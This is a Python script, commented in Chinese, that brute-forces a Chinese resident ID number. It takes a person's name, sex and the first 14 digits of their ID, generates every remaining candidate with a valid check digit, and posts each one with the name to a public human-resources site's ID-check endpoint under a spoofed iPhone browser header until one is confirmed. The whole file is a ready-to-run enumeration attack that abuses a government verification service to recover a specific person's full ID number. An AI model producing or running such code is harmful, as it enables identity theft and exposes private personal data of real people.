import random
import argparse
import requests
import asyncio
import aiohttp

# 创建命令行参数解析器
parser = argparse.ArgumentParser(description="身份证生成和验证工具")
# 添加命令行参数：身份证前14位
parser.add_argument('-ic', '--idcard_prefix', type=str, required=True, help="身份证号码前14位")
# 添加命令行参数：姓名
parser.add_argument('--name', '-n', type=str, required=True, help="姓名")
# 添加命令行参数：性别，只能是"男"或"女"
parser.add_argument('--sex', '-s', type=str, choices=["男", "女"], required=True, help="性别（男/女）")

# 解析命令行参数
args = parser.parse_args()

# 获取用户输入
idcard_prefix = args.idcard_prefix
name = args.name
gender = args.sex

# 计算第十八位
def calculate_check_digit(id17):
    """
    计算并返回17位身份证号码的校验位。

    参数:
    id17 (str): 17位身份证号码。

    返回:
    str: 第18位校验位。
    """
    # 系数数组
    coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    # 校验码数组
    check_digits = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']

    # 计算加权和
    sum_of_products = sum(int(id17[i]) * coefficients[i] for i in range(17))
    # 计算余数
    remainder = sum_of_products % 11
    # 返回校验码
    return check_digits[remainder]

# 确定第15位数字，根据性别
if gender.lower() == "男":
    idcard_15th = [str(number) for number in range(10) if number % 2 != 0]
elif gender.lower() == "女":
    idcard_15th = [str(number) for number in range(10) if number % 2 == 0]
else:
    print("性别输入错误，请输入'男'或'女'")
    exit()

# 生成15位身份证号列表
idcard15_list = [idcard_prefix + str(idcard_15th) for idcard_15th in idcard_15th]
idcard_1617 = [idcard + f'{i:02d}' for idcard in idcard15_list for i in range(0, 99)]

# 为每个17位号码计算并添加校验位
generated_idcards = [idcard + calculate_check_digit(idcard) for idcard in idcard_1617]
id_card_list = [{"id_card": idcard + calculate_check_digit(idcard)} for idcard in idcard_1617]

# 异步验证身份证号码是否有效
async def validate_id_card(id_card, fixed_name):
    """
    异步验证身份证号码是否有效。

    参数:
    id_card (str): 身份证号码。
    fixed_name (str): 姓名。

    返回:
    bool: 身份证验证结果，True为验证通过，False为未通过。
    """
    headers = {
        'Host': 'www.renshenet.org.cn',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'depCode': '0004',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.renshenet.org.cn',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
        'Content-Length': '47',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty'
    }

    data = {
        "idcard": id_card,
        "name": fixed_name
    }

    try:
        response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers, json=data)
        response.raise_for_status()
        result = response.json().get("data", {}).get("isSucces")
        if result:
            print(f"身份证号码 {id_card} ✅验证通过")
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"请求错误: {e}")
        return False

# 异步验证多个身份证号码
async def validate_id_cards(id_card_list, fixed_name):
    for user in id_card_list:
        result = await validate_id_card(user['id_card'], fixed_name)
        if result:
            return

asyncio.run(validate_id_cards(id_card_list, name))
